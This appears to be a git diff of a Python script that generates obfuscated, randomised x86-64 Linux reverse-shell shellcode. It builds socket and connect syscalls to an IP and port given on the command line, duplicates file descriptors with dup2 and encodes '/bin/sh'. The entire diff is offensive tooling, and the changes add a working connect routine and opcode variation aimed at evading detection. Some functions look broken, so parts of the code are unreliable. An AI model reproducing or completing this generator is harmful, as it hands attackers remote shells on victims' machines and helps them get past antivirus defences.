@@ -69,7 +69,7 @@ def offus(string4Payload, rand):
         numInHex = int(sub,16) + rand
         newString = newString + str(numInHex)
     
-    return newString
+    PAYLOAD += newString
 
 
 def clean(reg):
@@ -86,22 +86,13 @@ def clean(reg):
         l = ["4831d2","4829d2", "48c1ea10"]
         return l[r(0,2)]
     elif str(reg) == "rsi":
-        l = ["4831f6", "48c1ee10", "4829f6"]
-        return l[r(0,2)]
+        l = ["4831f6", "48c1ee10"]
+        return l[r(0,1)]
     elif str(reg) == "rdi":
-        l = ["4831ff","48c1ef10","4829ff"]
-        return l[r(0,2)]
+        l = ["4831ff","48c1ef10"]
+        return l[r(0,1)]
 
 
-def ip_to_opcode(ip, port):
-    ip_array = ip.split('.')
-    pi = ip_array[3] +'.'+ip_array[2]+'.'+ip_array[1]+'.'+ip_array[0]
-    hexpi = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, pi.split('.')))
-    port_length = len(port)
-    print(port_length)
-    ropt = hex(socket.htons(int(port)))
-    print(hexpi)
-    print(ropt)
 
 
 def create_socket():
@@ -127,9 +118,45 @@ def create_socket():
         PAYLOAD += "48ffc6"
     PAYLOAD += call()
 
+def ip_to_opcode(ip, port):
+    ip_array_greater = []
+    ip_array_little = [0]*4
+    port_array_greater = []
+    port_array_little = []
+    i = 0
+    for ip in ip.split('.'):
+        print(len(ip_array_little))
+        ip_array_greater.append(r(int(ip)+1, 255))
+        ip_array_little[i] = ip_array_greater[i] - int(ip) 
+        i+=1
+    #print(ip_array_little)
+    #print(ip_array_greater)
+    hexip_great = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip_array_greater))
+    port_length = len(port)
+    ropt = hex(socket.htons(int(port)))
+    print(hexip_great.lower())
+    print(ropt.lower())
+    socket_connect(hexip_great.lower(), ropt.lower())
 
-#def socket_connect(ip, port):
-    #global PAYLOAD
+
+def socket_connect(ip, port):
+    global PAYLOAD
+    l = ["4889c74989fa", "4889c74989c2", "50415a4C89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
+    PAYLOAD += l[r(0,len(l)-1)]   
+    clean("rax")
+    PAYLOAD += "B02a" if r(0,1) else "042a"
+    clean("rbx")
+    PAYLOAD += "53" # push rbx
+
+    PAYLOAD += 'be'
+    PAYLOAD += str(ip)
+    PAYLOAD += "566668" # push
+    PAYLOAD += port[2:] + port[:2] # Le port en little endian    
+    PAYLOAD += "666a02" #AF_INET
+    PAYLOAD += "4889e6" if r(0,1) else "4831f64801e6" # soit on fait "mov rsi, rsp" soit on fait "xor rsi, rsi ; add rsi, rsp"
+    PAYLOAD += "b218" # mov dl,24
+    PAYLOAD += call()
+    return PAYLOAD
 
 
 
@@ -163,12 +190,7 @@ def _exit():
 
 
 def call():
-    l = ["cd80","0f05"]
-    return str(l[r(0,1)])
-
-def bit_to_opcode(payload):
-    byte = ""
-    return byte
+    return '0f05'
 
 def shellcodize(PAYLOAD):
     shellcode = 'X'
@@ -183,12 +205,16 @@ PAYLOAD += clean("rcx")
 PAYLOAD += clean("rdx")
 PAYLOAD += clean("rdi")
 PAYLOAD += clean("rsi")
+PAYLOAD += clean("rbx")
+PAYLOAD += clean("rsi")
 create_socket()
 ip_to_opcode(argv[1], argv[2])
 dup2x3()
+
+factorOffus("0x68732f0069622f2f")
 #print(PAYLOAD)
 _exit()
 
 #print(bit_to_opcode(PAYLOAD))
-print(PAYLOAD)
+#print(PAYLOAD)
 print(shellcodize(PAYLOAD))
